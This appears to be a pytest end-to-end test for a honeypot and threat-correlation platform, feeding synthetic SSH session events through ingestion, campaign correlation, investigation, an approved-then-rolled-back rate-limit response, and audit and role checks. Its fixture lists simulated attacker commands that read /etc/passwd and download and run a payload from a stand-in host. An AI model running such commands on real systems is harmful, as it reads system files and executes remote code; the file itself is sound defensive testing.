from __future__ import annotations

from datetime import datetime, timedelta, timezone

import httpx


def _session_events(session_id: str, ip: str, start: datetime, shared_indicator: str) -> list[dict]:
    commands = [
        "uname -a",
        "cat /etc/passwd",
        "wget http://198.51.100.77/e2e-payload",
        "chmod +x e2e-payload",
        "./e2e-payload --beacon",
    ]
    events = []
    cursor = start
    for command in ["deploy", "backup"]:
        cursor += timedelta(seconds=20)
        events.append(
            {
                "schema_version": "1.0",
                "occurred_at": cursor.isoformat(),
                "source_module": "honeypot",
                "event_type": "honeypot.ssh.login_failed",
                "source_ip": ip,
                "session_id": session_id,
                "target_id": "decoy-ssh-1",
                "severity": "low",
                "provenance": {
                    "collector": "e2e-cowrie",
                    "source": "cowrie",
                    "reliability": 0.9,
                    "synthetic": True,
                    "indicators": [shared_indicator],
                },
                "features": {"username": "deploy", "success": False, "client_version": "SSH-2.0-e2e"},
            }
        )
    for command in commands:
        cursor += timedelta(seconds=25)
        events.append(
            {
                "schema_version": "1.0",
                "occurred_at": cursor.isoformat(),
                "source_module": "honeypot",
                "event_type": "honeypot.ssh.command",
                "source_ip": ip,
                "session_id": session_id,
                "target_id": "decoy-ssh-1",
                "severity": "medium",
                "provenance": {
                    "collector": "e2e-cowrie",
                    "source": "cowrie",
                    "reliability": 0.9,
                    "synthetic": True,
                    "indicators": [shared_indicator],
                },
                "features": {
                    "command": command,
                    "username": "deploy",
                    "success": True,
                    "client_version": "SSH-2.0-e2e",
                },
            }
        )
    return events


def test_complete_journey_from_telemetry_to_response(client, sensor_headers, admin_headers):
    from app.deception.http_decoy import start_decoy

    start = datetime.now(timezone.utc) - timedelta(minutes=45)
    events = _session_events("e2e-1", "203.0.113.61", start, "ssh-key:e2e")
    events += _session_events("e2e-2", "203.0.113.62", start + timedelta(minutes=5), "ssh-key:e2e")
    ingest = client.post("/api/v1/ingest/events", json=events, headers=sensor_headers)
    assert ingest.status_code == 202 and ingest.json()["accepted"] == len(events)

    run = client.post("/api/v1/correlate", json={"window_hours": 24}, headers=admin_headers)
    assert run.status_code == 200, run.text
    assert run.json()["campaigns"] >= 1

    campaigns = client.get("/api/v1/campaigns", headers=admin_headers).json()["items"]
    campaign = next(item for item in campaigns if item["member_count"] == 2)
    detail = client.get(f"/api/v1/campaigns/{campaign['id']}", headers=admin_headers).json()
    assert detail["ip_count"] == 2 if "ip_count" in detail else len(detail["ips"]) == 2
    assert detail["explanation"]["risk"]["risk_score"] > 0
    assert detail["edges"][0]["evidence"]["algorithm_version"].startswith("corr-")

    plan = client.post(
        "/api/v1/investigations", json={"campaign_id": campaign["id"]}, headers=admin_headers
    )
    assert plan.status_code == 201, plan.text
    investigation_id = plan.json()["id"]
    activation = client.post(
        f"/api/v1/investigations/{investigation_id}/activate",
        json={"source_ip": "127.0.0.1"},
        headers=admin_headers,
    )
    assert activation.status_code == 200

    decoy = start_decoy(host="127.0.0.1", port=0, profile_name="http-wordpress")
    try:
        httpx.get(f"http://127.0.0.1:{decoy.port}/admin", timeout=5.0)
    finally:
        decoy.stop()

    evaluation = client.post(
        f"/api/v1/investigations/{investigation_id}/evaluate", headers=admin_headers
    )
    assert evaluation.status_code == 200
    assert evaluation.json()["outcome"] in {
        "strengthened",
        "weakened",
        "unchanged",
        "insufficient_evidence",
        "relationship_removed",
    }

    feedback = client.post(
        "/api/v1/feedback",
        headers=admin_headers,
        json={"object_type": "campaign", "object_id": campaign["id"], "label": "supported"},
    )
    assert feedback.status_code == 201

    response = client.post(
        "/api/v1/responses",
        headers=admin_headers,
        json={
            "action": "apply_rate_limit",
            "target": "203.0.113.61",
            "confidence": 0.93,
            "severity": "high",
            "risk_level": "high",
            "risk_score": 80.0,
            "reason": "End-to-end test containment request",
            "ttl_minutes": 15,
        },
    )
    assert response.status_code == 201, response.text
    response_id = response.json()["id"]
    assert response.json()["status"] == "pending_approval"

    approved = client.post(f"/api/v1/responses/{response_id}/approve", headers=admin_headers)
    assert approved.status_code == 200 and approved.json()["status"] == "applied"
    rolled = client.post(f"/api/v1/responses/{response_id}/rollback", headers=admin_headers)
    assert rolled.status_code == 200 and rolled.json()["status"] == "rolled_back"

    audit = client.get("/api/v1/audit", headers=admin_headers).json()["items"]
    actions = {entry["action"] for entry in audit}
    assert {
        "events.ingest",
        "correlation.run",
        "investigation.plan",
        "investigation.activate",
        "investigation.evaluate",
        "analyst.feedback",
        "response.request",
        "response.approve",
        "response.rollback",
    } <= actions


def test_role_boundaries_across_the_journey(client, viewer_headers, admin_headers):
    assert client.post("/api/v1/correlate", json={}, headers=viewer_headers).status_code == 403
    assert client.get("/api/v1/audit", headers=viewer_headers).status_code == 403
    assert client.get("/api/v1/feedback", headers=viewer_headers).status_code == 403

    assert client.get("/api/v1/campaigns", headers=viewer_headers).status_code == 200
    assert client.get("/api/v1/events", headers=viewer_headers).status_code == 200
    assert client.get("/api/v1/crypto/assets", headers=viewer_headers).status_code == 200
    assert client.get("/api/v1/websec/findings", headers=viewer_headers).status_code == 200
    assert client.get("/api/v1/audit", headers=admin_headers).status_code == 200


def test_health_headers_are_present(client):
    response = client.get("/api/v1/health")
    assert response.headers["X-Content-Type-Options"] == "nosniff"
    assert response.headers["X-Frame-Options"] == "DENY"
    assert response.headers["Referrer-Policy"] == "no-referrer"
